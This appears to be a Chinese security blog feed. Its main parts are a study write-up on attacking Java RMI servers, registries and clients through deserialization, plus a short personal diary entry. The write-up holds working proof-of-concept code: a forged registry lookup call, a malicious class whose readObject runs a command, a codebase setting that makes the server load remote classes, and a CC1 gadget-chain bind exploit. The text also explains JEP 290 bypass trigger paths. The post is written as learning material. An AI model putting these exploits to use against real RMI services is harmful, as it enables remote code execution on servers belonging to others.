&#x3D; remoteCall.getOutputStream();        Field enableReplace_filed &#x3D; ObjectOutputStream.class.getDeclaredField(&quot;enableReplace&quot;);        enableReplace_filed.setAccessible(true);        enableReplace_filed.setBoolean(outputStream, false);        outputStream.writeObject(name);        outputStream.writeObject(obj);        ref.invoke(remoteCall);        ref.done(remoteCall);    &#125;    static void lookupReflection(Object obj, Registry registry) throws Exception &#123;        Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;);        Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;);        declaredField.setAccessible(true);        RemoteRef ref0 &#x3D; (RemoteRef) declaredField.get(registry);        &#x2F;&#x2F;获取 operations        Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;);        Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;);        operations_field.setAccessible(true);        Operation[] operations &#x3D; (Operation[]) operations_field.get(registry);&#x2F;&#x2F;伪造lookup        RemoteCall var2 &#x3D; ref0.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);        ObjectOutput var3 &#x3D; var2.getOutputStream();        Field enableReplace_filed &#x3D; ObjectOutputStream.class.getDeclaredField(&quot;enableReplace&quot;);        enableReplace_filed.setAccessible(true);        enableReplace_filed.setBoolean(var3, false);        var3.writeObject(obj);        ref0.invoke(var2);    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521232049898.png" alt="image-20230521232049898"></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>另外还有一点关于JEP 290绕过方式的补充</p><p>在JDK8u231之前，用那个payload打注册中心，会有一个现象，就是当客户端发送完请求之后，服务端会在经过一段时间后就弹一个计算器出来。</p><p>这是由于DGCClient#registerRefs，可以看到这是个循环，如果epEntry.registerRefs返回的是false，就会一直卡在这个循环里</p><p>其实<strong>这里是一个DGC客户端不断向DGC服务端汇报远程对象ref的存活状况，当ref不存在时，该方法的返回值就会是true了，然后就会跳出循环。这样就会造成一个有趣的现象：DGC客户端以一定的时间间隔向DGC服务端(恶意的JRMP服务端)发起请求，类似TCP连接的心跳包，又类似一个不死马，受攻击的DGC客户端(这里是Registry端)会以同频的时间间隔不断弹出计算器。</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521232639466.png" alt="image-20230521232639466"></p><p>调用栈</p><pre class="language-txt" data-language="txt"><code class="language-txt">readObject:431, ObjectInputStream (java.io)executeCall:252, StreamRemoteCall (sun.rmi.transport)invoke:161, UnicastRef (sun.rmi.server)invokeRemoteMethod:227, RemoteObjectInvocationHandler (java.rmi.server)invoke:179, RemoteObjectInvocationHandler (java.rmi.server)createServerSocket:-1, $Proxy0 (com.sun.proxy)newServerSocket:666, TCPEndpoint (sun.rmi.transport.tcp)listen:335, TCPTransport (sun.rmi.transport.tcp)exportObject:254, TCPTransport (sun.rmi.transport.tcp)...exportObject:346, UnicastRemoteObject (java.rmi.server)reexport:268, UnicastRemoteObject (java.rmi.server)readObject:235, UnicastRemoteObject (java.rmi.server)</code></pre><h1 id="JDK8u241修复"><a href="#JDK8u241修复" class="headerlink" title="JDK8u241修复"></a>JDK8u241修复</h1><p>在调用UnicastRef.invoke之前声明方法的类，必须要实现Remote接口，然而这里的RMIServerSocketFactory并没有实现，于是无法进入到invoke方法，直接抛出错误。</p><p>抬走了，等一手0day</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然写完了，但实际上还有许多细节的部分有点不懂，RMI的东西实在是有点多而且繁琐，这三篇也只能算个基础，还要去学JNDI注入之类的。而且还有一些关于RMI攻击的工具没有用过，比如RMIScout、BaRMIe、ysomap等，还是以后用到了再补吧。<del>比如对于绕过JEP290的方式中，触发反序列化具体的路径是哪里之类的，因为有点懒所以并没有仔细的跟过</del>（补上了，还有就是感谢互联网的共享精神（，感觉这三篇rmi里，有一篇半都是照抄别人的内容。</p><p>最后偷张图</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/20200702100127-f0d4c18c-bc07-1.png" alt="20200702100127-f0d4c18c-bc07-1"></p><h1 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h1><p>补一下触发反序列化的地方</p><p>绕过JDK8u231的payload反序列化触发点是</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230522093912129.png" alt="image-20230522093912129"></p><p>从RegistryImpl_Skel里的这个readObject直接跳到UnicastRemoteObject</p><p>然后会走我们在前边写的从UnicastRemoteObject到UnicastRef.Invoke的路线，在invoke里的这行会触发一个jrmp请求，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230522102823178.png" alt="image-20230522102823178"></p><p>然后就会把从恶意服务端请求回来的结果传进StreamRemoteCall#executeCall，实现攻击的目的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230522102939678.png" alt="image-20230522102939678"></p><p>而在在JDK8U231之前绕过JEP290的触发点同样也是从RegistryImpl_Skel开始的</p><p>首先是从in.readObject，在这里面会让incomingRefTable的值不为空，然后进入call.releaseInputStream里，去触发我们之前写的UnicastRef的反序列化路线</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230522104237433.png" alt="image-20230522104237433"></p><p>最终在DGCImpl_Stub#dirty里发起了一个jrmp请求</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230522104407951.png" alt="image-20230522104407951"></p><p>然后同样是把从恶意服务端返回来的东西调到传进UnicastRef#Invoke，然后再进入StreamRemoteCall#executeCall，实现攻击的目的</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://paper.seebug.org/1689/">https://paper.seebug.org/1689/</a> （前两部分基本上都抄的这个</p><p><a href="https://halfblue.github.io/2021/11/03/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-JEP290%E7%BB%95%E8%BF%87/">RMI反序列化漏洞之三顾茅庐-JEP290绕过 | Halfblue</a>（UnicastRef的反序列化的部分细节可以看这个</p><p><a href="https://su18.org/post/rmi-attack/%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%83%A8%E5%88%86%E9%83%BD%E6%8A%84%E7%9A%84%E8%BF%99%E4%B8%AA">https://su18.org/post/rmi-attack/（反序列化部分都抄的这个</a></p><p><a href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p><p><a href="https://www.anquanke.com/post/id/211722">https://www.anquanke.com/post/id/211722</a></p><p><a href="https://yagsheg.com/2021/11/29/RMI-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93">https://yagsheg.com/2021/11/29/RMI-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记事簿</title>
      <link href="/2023/05/19/%E8%AE%B0%E4%BA%8B%E7%B0%BF/"/>
      <url>/2023/05/19/%E8%AE%B0%E4%BA%8B%E7%B0%BF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>单独开篇文章记一下自己每天都干嘛了，督促一下自己，虽然现在记好像有点晚了hhh</p></blockquote><h2 id="2023-05-19"><a href="#2023-05-19" class="headerlink" title="2023/05/19"></a>2023/05/19</h2><p>上午去看了一眼运动会开幕式，下午跟继续跟了一下，感觉最少配了四个小时环境。才刚看完攻击服务端的部分</p><h2 id="2023-05-20"><a href="#2023-05-20" class="headerlink" title="2023/05/20"></a>2023/05/20</h2><p>又看了会儿rmi，rmi基本的攻击部分看完了，然后对于高版本的绕过开了个头，感觉明天能结束这个。另外，T1打的真下饭啊，还是想看决赛中韩对抗</p><h2 id="2023-05-21"><a href="#2023-05-21" class="headerlink" title="2023/05/21"></a>2023/05/21</h2><p>大概弄完rmi了，明早再稍微改改就结束了</p><h2 id="2023-05-22"><a href="#2023-05-22" class="headerlink" title="2023/05/22"></a>2023/05/22</h2><p>终于把软著材料送走了，这种雨天真想睡觉啊</p><h2 id="2023-05-23"><a href="#2023-05-23" class="headerlink" title="2023/05/23"></a>2023/05/23</h2><p>jndi差一点</p><h2 id="2023-05-24"><a href="#2023-05-24" class="headerlink" title="2023/05/24"></a>2023/05/24</h2><p>jndi最后面的尾巴算结束了，<del>世上无难事，只要肯放弃</del>，fastjson算是简单的看完了吧，要多刷刷题准备国赛了</p><h2 id="2023-05-25"><a href="#2023-05-25" class="headerlink" title="2023/05/25"></a>2023/05/25</h2><p>准备国赛ing....</p><h2 id="2023-06-12"><a href="#2023-06-12" class="headerlink" title="2023/06/12"></a>2023/06/12</h2><p>国赛进了分区赛，也收到了工业互联网的决赛通知，被选为预备党员了，准备一下期末考试</p><p>今天收到了中科全安的口头offer，虽然这公司风评不好，但我真的很想要实战经历</p><p>还有夏令营的事，投材料真麻烦啊，就不能搞个教育部统一的系统吗。不知道能进几个夏令营，要是今年还是线上夏令营该多好啊</p><p><span style="color:#000000; background-color:#000000;">我现在前面两条路，保研和就业，我到底该选什么呢，坦白讲我对读研是抗拒的，我不喜欢偏理论的东西，我更想学更多的实践，学术界的东西真搞不明白，万物蹭深度学习发论文，可高校实验室里的深度学习模型又有谁能比得上openai的chatgpt呢。可是如果真能保研，我能和y4✌一样有勇气放弃这个名额吗<span></span></span></p><h2 id="2023-06-16"><a href="#2023-06-16" class="headerlink" title="2023/06/16"></a>2023/06/16</h2><p>接到北京绿盟的offer了，说起来绿盟这面试还真偏实战啊，关于漏洞原理的内容一点没问，问的全是真实环境的东西，不过给的钱也太少了点，好歹网安大厂，咋嫩扣捏。</p><h2 id="2023-06-17"><a href="#2023-06-17" class="headerlink" title="2023/06/17"></a>2023/06/17</h2><p>妈的，接了，谁让是黄埔军校呢</p><h2 id="2023-07-30"><a href="#2023-07-30" class="headerlink" title="2023/07/30"></a>2023/07/30</h2><p>一直没空写（懒，分区赛的二等奖，还是没能进一次国赛。绿盟感觉现在风评属于是急转直下了，不发年终奖，会多巴拉巴拉的，不过这和我一个实习生有什么关系呢hhhh，要是没学上想试一下长亭，然后再往甲方润</p><h2 id="2025-06-04"><a href="#2025-06-04" class="headerlink" title="2025/06/04"></a>2025/06/04</h2><p>准备开始更新喽</p><h2 id="2025-06-05"><a href="#2025-06-05" class="headerlink" title="2025/06/05"></a>2025/06/05</h2><p>这怎么能弹不了shell呢，服啦</p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI攻击（二）</title>
      <link href="/2023/05/18/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/05/18/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在第一篇的时候已经分析了RMI整个调用的流程，所以在这里就写一下攻击的流程</p><p>根据第一篇的分析</p><p>我们已知</p><h2 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a><strong>攻击服务端</strong></h2><p><strong>1.UnicastServerRef#dispatch -&gt; UnicastServerRef#unmarshalValue-&gt;客户端攻击服务端</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518160745279.png" alt="image-20230518160745279"></p><p><strong>2.UnicastServerRef#oldDispatch-&gt;DGCImpl_Skel#dispatch-&gt;客户端攻击服务端</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518160918311.png" alt="image-20230518160918311"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518161002709.png" alt="image-20230518161002709"></p><h2 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a><strong>攻击注册中心</strong></h2><p><strong>UnicastServerRef#oldDispatch-&gt;RegistryImpl_Skel#dispatch-&gt;客户端/服务端攻击注册中心</strong></p><p>这个路线和攻击服务端的DGCImpl_Skel是一样的，只不过skel不同罢了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518161205087.png" alt="image-20230518161205087"></p><h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a><strong>攻击客户端</strong></h2><p><strong>1.RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518162838720.png" alt="image-20230518162838720"></p><p>假如注册中心返回的是恶意对象，就可能在反序列化的时候被攻击</p><p><strong>2.UnicastRef#invoke-&gt;StreamRemoteCall#executeCall-&gt;注册中心/服务端攻击客户端</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518161821040.png" alt="image-20230518161821040"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518161830443.png" alt="image-20230518161830443"></p><p>理论上只要调用invoke方法的地方都可以被攻击，executeCall是真正处理网络请求的地方，如果请求后返回的内容的是TransportConstants.ExceptionalReturn这个错误，就会进行反序列化</p><p><strong>3.DGCImpl_Stub#dirty-&gt;服务端攻击客户端</strong></p><p>本质和2是一样的，只不过是通过DGCImpl_Stub调用了invoke方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518164558344.png" alt="image-20230518164558344"></p><p><strong>4.UnicastRef#invoke-&gt;UnicastRef#unmarshalValue-&gt;服务端攻击客户端</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518165513594.png" alt="image-20230518165513594"></p><h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>在前言里我们梳理了几种攻击的路径，接下来就来实际看看攻击方法。</p><p>我们先看一下在没有java安全机制的情况下的攻击实现</p><h2 id="攻击服务端-1"><a href="#攻击服务端-1" class="headerlink" title="攻击服务端"></a>攻击服务端</h2><h3 id="①-恶意服务参数"><a href="#①-恶意服务参数" class="headerlink" title="① 恶意服务参数"></a>① 恶意服务参数</h3><p>攻击路线：UnicastServerRef#dispatch -&gt; UnicastServerRef#unmarshalValue</p><p>在服务端接收到客户端的参数之后，会对服务端需要接受的参数类型进行判断</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519134149753.png" alt="image-20230519134149753"></p><p>假设不是基本类型，就会对传过来的内容进行反序列化，这里就可以成为我们的攻击点</p><p><strong>不过这个攻击有个条件，要求服务端必须接收与传入的poc类型一致的参数，最通用的就是Object类型，且客户端必须知道服务端实现的接口内容，否则的话不会到unmarshalValue就会报错</strong></p><p>然后就只需要保证传个能反序列化的poc且服务端有对应依赖就行了</p><p><img src="/2023/05/18/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%BA%8C%EF%BC%89/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20230519141121767.png" alt="image-20230519141121767"></p><p>我这里传了个cc1的链，代码可以看cc链的那篇文章</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519141443549.png" alt="image-20230519141443549"></p><p>但是如果只能攻击接收Object类型的接口，那本来就不大的攻击面就更小了，有没有办法能够攻击接收String类型的参数呢</p><p>答案是可以的</p><p>一般情况下，server端和client端的接口应该是一致的，而当不一致时，client端会报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519163747579.png" alt="image-20230519163747579"></p><p>根据报错可以知道，在UnicastServerRef.dispatch里的这一句是负责判断方法是否存在的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519163910265.png" alt="image-20230519163910265"></p><p>这句话会调用hashmap的get方法，然后获取指定 key 对应对 value</p><p>因为这个op是我们传进去的内容的key，和server端不同，自然不能查找到method，导致客户端报错。</p><p>那就是说如果我们能够控制这个key，那么即使我们传入的是其他东西，他也会找到method，然后继续执行这段程序，然后在unmarshalValue里进行反序列化</p><p>这里有四种方法</p><ul><li>通过网络代理，在流量层修改数据</li><li>自定义 “java.rmi” 包的代码，自行实现</li><li>字节码修改</li><li>使用 debugger</li></ul><p> <del>Java Agent不会，自定义 “java.rmi” 包的代码不会，流量层修改数据不会</del></p><p>这里我就只用debugger的方式改了</p><p>首先，虽然通过这种方式在服务端不接收Object类型参数的时候也可以把我们的poc传过去，但是，在改的时候必须保证客户端也需要有服务端所对应的方法。比如服务端是接收String类型的sayHallo方法，那么客户端也要有这个方法才能改成功</p><p>在客户端的RemoteObjectInvocationHandler类里的invokeRemoteMethod方法处下断点</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519165201947.png" alt="image-20230519165201947"></p><p>改之前</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519170948543.png" alt="image-20230519170948543"></p><p>改之后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519171050931.png" alt="image-20230519171050931"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519171115833.png" alt="image-20230519171115833"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519171129010.png" alt="image-20230519171129010"></p><h3 id="②-动态类加载"><a href="#②-动态类加载" class="headerlink" title="② 动态类加载"></a>② 动态类加载</h3><p>动态类加载是RMI的一个特性</p><p>如果客户端在调用时，<strong>传递了一个可序列化对象</strong>，这个对象在服务端不存在，会抛出ClassNotFound 的异常，但RMI支持动态类加载，若设置了<code>java.rmi.server.codebase</code>属性，则会尝试以该地址作为额外的classpath获取<code>.class</code>并加载和反序列化，可以使用以下两者方式指定</p><ul><li><code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:7777/&quot;);</code></li><li><code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code></li></ul><p>但是由于一些安全限制，这个攻击方式还有一些其他条件</p><ol><li>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置<code>java.security.policy</code>，这在后面的利用中可以看到。</li><li>属性 <code>java.rmi.server.useCodebaseOnly</code> 的值必需为false。但是从JDK 6u45、7u21版本之后开始，<code>java.rmi.server.useCodebaseOnly</code> 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的<code>java.rmi.server.codebase</code> 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li></ol><p>再来几点其他的东西</p><ul><li>动态类加载机制不区分角色，在三端中都可以触发</li><li>需要在触发动态类加载机制的一端设置<code>SecurityManager</code>，否则会报错。前面也提到了</li><li>需要在触态类加载机制的一端设置<code>java.rmi.server.useCodebaseOnly=false</code>，该方法用于限制该机制是否允许远程加载。</li><li>设置<code>java.rmi.server.codebase</code>为目标类远程地址，不是在触发端设置的，触发端并不知道地址，而是Client端提供的</li><li>恶意代码需要放在恶意类的static块或readObject中(回顾原生反序列化)</li></ul><p>首先，这玩意儿得先设置Java安全策略</p><p>你得先写一个xxx.policy</p><pre class="language-policy" data-language="policy"><code class="language-policy">grant &#123;    permission java.security.AllPermission;&#125;;</code></pre><p>这是最宽松的安全策略，java基本上可以干所有事</p><p>然后因为是攻击的是服务端，所以服务端还要使用这个安全策略</p><p>还要关闭useCodebaseOnly</p><pre class="language-java" data-language="java"><code class="language-java">System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;); System.setProperty(&quot;java.rmi.server.hostname&quot;, &quot;127.0.0.1&quot;);&#x2F;&#x2F;指定RMI服务器的主机名为127.0.0.1System.setProperty(&quot;java.security.policy&quot;, &quot;D:\\ctftools\\ctfscript\\javastudy\\RMIServer\\server.policy&quot;);if (System.getSecurityManager() &#x3D;&#x3D; null) &#123;            System.out.println(&quot;Setup SecurityManager&quot;);            System.setSecurityManager(new SecurityManager());&#x2F;&#x2F;设置安全管理器</code></pre><p>这个设置安全管理器一定要在设置安全策略后边，<del>真nm的，查了我一下午</del></p><p>服务端的设置就完成了</p><p>完整代码是</p><pre class="language-java" data-language="java"><code class="language-java">public class RMIServer &#123;    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException &#123;        if (System.getSecurityManager() &#x3D;&#x3D; null) &#123;           System.out.println(&quot;Setup SecurityManager&quot;);           System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);                                     System.setProperty(&quot;java.rmi.server.hostname&quot;, &quot;127.0.0.1&quot;);            System.setProperty(&quot;java.security.policy&quot;, &quot;D:\\ctftools\\ctfscript\\javastudy\\RMIServer\\server.policy&quot;);            System.setSecurityManager(new SecurityManager());        &#125;        System.out.println(&quot;Security Manager: &quot; + System.getSecurityManager());        System.out.println(&quot;Security Policy: &quot; + System.getProperty(&quot;java.security.policy&quot;));        IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl();        &#x2F;&#x2F; 设置安全策略后再创建注册中心        LocateRegistry.createRegistry(1099);        Naming.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;iRemoteObj&quot;, iRemoteObj);        System.out.println(&quot;Registry运行中......&quot;);    &#125;&#125;</code></pre><p>然后再准备一个恶意类，因为你要借助的是动态类加载，所以恶意类的恶意代码只能写在静态代码块里，或者是readObject里</p><pre class="language-java" data-language="java"><code class="language-java">public class evil implements Serializable &#123;    static &#123;        try &#123;            System.out.println(&quot;success&quot;);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    private void readObject(java.io.ObjectInputStream s)            throws IOException, ClassNotFoundException, IOException &#123;        &#x2F;&#x2F; Read in the threshold (ignored), loadfactor, and any hidden stuff        s.defaultReadObject();        System.out.println(&quot;readObject&quot;);        Runtime.getRuntime().exec(&quot;calc&quot;);    &#125;&#125;</code></pre><p>客户端</p><pre class="language-java" data-language="java"><code class="language-java">public class RMIClient implements Serializable &#123;    public static void main(String[] args) throws Exception&#123;        IRemoteObj remoteObj &#x3D; (IRemoteObj)Naming.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;iRemoteObj&quot;);        Object evil &#x3D; new evil();        String s &#x3D; remoteObj.sayHello(evil);    &#125;&#125;</code></pre><p>我们首先来测试一下</p><p>把evil这个文件放到服务端</p><p>然后执行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519212319623.png" alt="image-20230519212319623"></p><p>简单跟一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519214503718.png" alt="image-20230519214503718"></p><p>还是unmarshalValue那地方对客户端传过来的参数做反序列化的时候导致的类加载和反序列化（没跟出来怎么进行了类加载，虽然确实调用了resolveClass进行了类加载，但是没看出来咋跳过去的，就贴个执行的图吧</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519220617845.png" alt="image-20230519220617845"></p><p>然后接下来我们把这个evil文件从服务端删掉</p><p>这时候再执行客户端会报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519220807873.png" alt="image-20230519220807873"></p><p>再配置一下客户端</p><pre class="language-txt" data-language="txt"><code class="language-txt">-Djava.rmi.server.useCodebaseOnly&#x3D;false -Djava.rmi.server.codebase&#x3D;http:&#x2F;&#x2F;192.168.1.104:8888&#x2F;</code></pre><p>或者用代码</p><pre class="language-none"><code class="language-none">System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);        System.setProperty(&quot;java.rmi.server.codebas&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;&quot;);</code></pre><p>然后用python在字节码的路径下面开个8888端口的服务</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519222257800.png" alt="image-20230519222257800"></p><p>这里还是报错了，但是看一眼服务器</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519222325440.png" alt="image-20230519222325440"></p><p>说明服务端已经请求了这个网址，只不过因为路径问题所以没有访问到。所以换个路径</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519222502503.png" alt="image-20230519222502503"></p><p>成了</p><p>这个漏洞其实感觉利用面也挺小的，现在的服务应该大部分都是java8了，而这些配置的要求很难实现</p><h3 id="③-替身攻击"><a href="#③-替身攻击" class="headerlink" title="③ 替身攻击"></a>③ 替身攻击</h3><p>看其他师傅的博客里说的一种，但是感觉有点鸡肋了</p><blockquote><p>在讨论对 Server 端的攻击时，还出现了另外一种针对参数的攻击思路，我称其为替身攻击。依旧是用来绕过当参数不是 Object，是指定类型，但是还想触发反序列化的一种讨论。</p><p>大体的思路就是调用的方法参数是 <code>HelloObject</code>，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。</p><p>这的确是一种思路，但是还不如 hook RMI 代码修改逻辑来得快，所以这里不进行测试。</p></blockquote><h2 id="攻击注册中心-1"><a href="#攻击注册中心-1" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h2><p>再来看攻击注册中心</p><p>根据前言的内容，攻击注册中心的路径是这条</p><p><strong>UnicastServerRef#oldDispatch-&gt;RegistryImpl_Skel#dispatch-&gt;客户端/服务端攻击注册中心</strong></p><p>其实对于注册中心而言，他根本就不需要知道哪个是客户端，哪个是服务端，他只需要知道有人调用了bind和lookup这些方法就行了</p><p>调用bind的就是服务端要绑定方法，调用lookup就是客户端要查找方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519133544155.png" alt="image-20230519133544155"></p><p>但是由于参数的问题<code>lookup</code>、<code>unbind</code>的参数类型都是String，这在运行前编写代码时限制了我们传入恶意Object。不过可以跟攻击服务端的时候的方式一样，去绕过这个</p><h3 id="调用bind-amp-rebind"><a href="#调用bind-amp-rebind" class="headerlink" title="调用bind&amp;rebind"></a>调用bind&amp;rebind</h3><p>bind和rebind这两个实际上就是服务端攻击注册中心，但是利用价值不是很高，因为高版本java的服务端和注册中心本来就在一起，因此不需要去打</p><p><strong>还有一个问题就是，如果服务端和客户端在一起，那可以直接通过<code>Registry registry = LocateRegistry.createRegistry(1098)</code>的方式获取注册中心，然后进行绑定，也就不需要借助stub进行代理然后通信了，可以直接和skel通信，那么在skel里，由于反序列化的是网络通信传过来的东西，现在没网络通信了，自然没东西进行反序列化了</strong></p><p>所以必须使用<code>Registry registry = LocateRegistry.getRegistry(1098);</code>来获取注册中心</p><p>poc</p><pre class="language-java" data-language="java"><code class="language-java">public class RMIServer &#123;    public static void main(String[] args) throws IOException, AlreadyBoundException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;        &#x2F;&#x2F;创建远程对象        IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl();        &#x2F;&#x2F;创建注册中心        LocateRegistry.createRegistry(1098);        &#x2F;&#x2F;获取注册中心        Registry registry &#x3D; LocateRegistry.getRegistry(1098);        &#x2F;&#x2F;这就是个单纯的cc1的链        Object o &#x3D; cc1.cc1exp();        &#x2F;&#x2F;下面部分就是创建一个Remote类型的动态代理，因为bind的第二个参数要求传入Remote类型的        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class);        HashMap&lt;String, Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;ethe&quot;,o);        declaredConstructor.setAccessible(true);        InvocationHandler o1 &#x3D; (InvocationHandler)declaredConstructor.newInstance(Override.class,map);        Remote remote &#x3D; (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, o1);        registry.bind(&quot;iRemoteObj&quot;,remote);&#x2F;&#x2F;        Naming.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;iRemoteObj&quot;,iRemoteObj);    &#125;&#125;</code></pre><p>这里我本来想让这个cc1的文件直接继承Remote接口的，但是发现即使继承了，由于他返回的是个HashMap，也不能让HashMap强转成Remote，而要让HashMap也继承Remote接口的话就只能改源码了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520122455415.png" alt="image-20230520122455415"></p><h3 id="调用lookup-amp-unbind"><a href="#调用lookup-amp-unbind" class="headerlink" 